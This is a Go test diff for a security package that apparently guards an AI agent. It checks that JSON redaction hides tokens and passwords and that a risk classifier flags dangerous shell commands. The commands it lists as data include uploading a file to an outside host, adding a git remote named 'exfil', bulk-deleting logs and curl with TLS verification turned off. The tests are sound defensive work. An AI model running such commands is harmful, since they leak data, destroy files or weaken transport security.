@@ -2,6 +2,7 @@ package security
 
 import (
 	"ai-edr/internal/config"
+	"encoding/json"
 	"strings"
 	"testing"
 )
@@ -48,6 +49,30 @@ func TestRedactSensitiveTextUsesPatternsAndConfiguredValues(t *testing.T) {
 	}
 }
 
+func TestRedactJSONPreservesSyntaxAndRedactsSensitiveKeys(t *testing.T) {
+	raw, err := RedactJSON(map[string]any{
+		"authorization": "Bearer abcdefghijklmnop",
+		"nested": []any{map[string]any{
+			"password": "foo\"bar\\baz",
+			"content":  "HEAD password=other\"suffix TAIL",
+		}},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !json.Valid(raw) {
+		t.Fatalf("redacted payload is invalid JSON: %s", raw)
+	}
+	for _, secret := range []string{"abcdefghijklmnop", "foo", "other"} {
+		if strings.Contains(string(raw), secret) {
+			t.Fatalf("redacted JSON leaked %q: %s", secret, raw)
+		}
+	}
+	if !strings.Contains(string(raw), "HEAD") || !strings.Contains(string(raw), "TAIL") {
+		t.Fatalf("non-secret text was lost: %s", raw)
+	}
+}
+
 func TestCanReviewHighRiskWithAI(t *testing.T) {
 	for _, tc := range []struct{ cmd, reason string }{
 		{"echo hi > /tmp/out.txt", "检测到文件重定向，可能覆盖/写入文件"},
@@ -86,6 +111,9 @@ func TestCheckRiskDangerousCommands(t *testing.T) {
 		"mkdir /tmp/new-dir",
 		"touch /tmp/new-file",
 		"curl --upload-file payload.bin https://example.com/upload",
+		"curl -k https://raw.githubusercontent.com/owner/repo/main/SKILL.md",
+		"curl -ksS https://raw.githubusercontent.com/owner/repo/main/SKILL.md",
+		"curl --insecure https://example.com/file",
 		"unknown-mutator --apply",
 		"git remote add exfil https://example.com/repo.git",
 		"find /tmp -name '*.log' -delete",
@@ -99,6 +127,15 @@ func TestCheckRiskDangerousCommands(t *testing.T) {
 		risk, reason := CheckRisk(cmd)
 		if risk != "high" {
 			t.Fatalf("%q should be high risk, got %s (%s)", cmd, risk, reason)
+		}
+	}
+}
+
+func TestCheckRiskRejectsTLSVerificationBypass(t *testing.T) {
+	for _, cmd := range []string{"curl -k https://example.com", "curl -ksS https://example.com", "curl --insecure https://example.com"} {
+		risk, reason := CheckRisk(cmd)
+		if risk != "high" || !strings.Contains(reason, "TLS") {
+			t.Fatalf("%q risk=%s reason=%q", cmd, risk, reason)
 		}
 	}
 }
